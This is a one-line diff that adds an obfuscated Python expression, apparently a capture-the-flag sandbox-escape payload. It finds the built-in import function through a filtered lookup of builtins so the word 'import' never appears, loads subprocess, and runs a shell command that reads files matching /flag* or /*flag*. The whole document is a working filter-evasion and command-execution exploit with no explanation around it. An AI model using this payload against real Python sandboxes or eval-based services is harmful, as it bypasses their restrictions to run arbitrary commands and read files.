@@ -1,0 +1,1 @@
+__builtins__.__dict__[list(filter(lambda x:'import' in x,dir(__builtins__)))[0]]('subprocess').check_output(['sh','-c','cat /flag* 2>/dev/null || cat /*flag* 2>/dev/null'])
